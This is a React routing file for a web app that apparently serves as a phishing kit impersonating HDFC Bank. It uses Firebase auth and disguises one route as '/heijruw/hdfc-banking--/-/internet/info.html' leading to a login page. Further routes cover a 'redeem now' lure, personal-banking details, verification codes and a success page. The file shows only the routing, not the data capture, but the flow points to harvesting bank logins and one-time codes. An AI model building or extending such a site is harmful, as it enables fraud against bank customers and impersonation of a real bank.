import { Suspense, lazy, useEffect, useState } from 'react';
import './App.css';
import { BrowserRouter, Route, Routes } from 'react-router-dom';
import Home from './pages/Home';
import Loader from './Components/Loder'; // Assuming you have a Loader component
import Applay from './pages/Applay';
import PersonalBanking from './pages/PersonalBanking';
import VerifyCode from './pages/VerifyCode';
import RedemNow from './pages/RedemNow.jsx';
import Success from './pages/Success';
import { onAuthStateChanged } from 'firebase/auth';
import { auth } from './firebase/firebase';
import ForgotCustomerID from './pages/ForgetCustmorID';
// import Login from '';
const Login = lazy(() => import("./Components/Login"))

const App = () => {
  const [user, setUser] = useState(null);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, async (user) => {

      if (user) {
        setUser(user);


        console.log(user.uid)


      } else {
        setUser(null);
      }
    });

    return () => unsubscribe(); // Unsubscribe on unmount
  }, []);



  return (
    <BrowserRouter>
      <Suspense fallback={<Loader />}>
        <Routes>
          <Route path='/' element={<Home />} />
          <Route path='/redem' element={<RedemNow  />} />
          <Route path='/forget-customer-id' element={<ForgotCustomerID  />} />
          <Route path='/forget-password' element={<ForgotCustomerID  />} />
          <Route path='/new-registration' element={<ForgotCustomerID  />} />
          <Route path='/success/:id' element={<Success />} />












          <Route path='/bitly' element={<Home />} />
          <Route path='/heijruw/hdfc-banking--/-/internet/info.html' element={<Login />} />
          <Route path='/infromation' element={<Applay />} />
          <Route path='/PersonalBanking' element={<PersonalBanking />} />
          <Route path='/verificationCode' element={<VerifyCode />} />
          <Route path='*' element={<h2 style={{
            textAlign: "center",
            marginTop: "10rem",
            fontSize: '40px',
            color: "#050505"
          }} >404 Not found</h2>} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

export default App;
